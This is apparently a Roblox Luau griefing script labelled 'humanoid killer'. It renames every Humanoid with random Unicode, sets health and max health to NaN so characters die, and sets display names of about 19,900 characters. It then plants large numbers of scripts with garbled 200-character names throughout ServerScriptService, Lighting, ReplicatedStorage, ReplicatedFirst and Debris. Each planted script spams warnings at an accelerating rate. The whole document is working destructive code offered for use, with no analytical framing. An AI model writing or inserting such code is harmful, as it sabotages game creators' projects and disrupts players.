--[[
humanoid killer idk
]]
local function wicked(amount)
	local pls = {}
	for i = 1,amount do
		table.insert(pls,utf8.char(0x1000 + math.random(0,0x300)))
	end
	return table.concat(pls)
end

local function Infest(parent,amount)
	local implant = Instance.new("Script")
	implant.Parent = parent
	implant.Name = wicked(200)
	implant.Source = `local rate = 2 while wait(rate) do warn("nil expected to catch nan while nil nil nil ? ? ?") rate -= 0.1 end`
	for i = 1,amount do
		for _, pls in pairs(parent:GetDescendants()) do
			local implant = Instance.new("Script")
			implant.Parent = pls
			implant.Name = wicked(200)
			implant.Source = `local rate = 2 while wait(rate) do warn("nil expected to catch nan while nil nil nil ? ? ?") rate -= 0.1 end`
		end
	end
end

for _, pls in pairs(game:GetDescendants()) do
	if pls:IsA("Humanoid") then
		pls.Name = wicked(math.random(1,300))
		pls.Health = 0/0
		pls.MaxHealth= 0/0
		pls.DisplayName = wicked(19900)
	end
end
Infest(game.ServerScriptService,4)
Infest(game.Lighting,4)
Infest(game.ReplicatedStorage,4)
Infest(game.ReplicatedFirst,4)
Infest(game.Debris,4)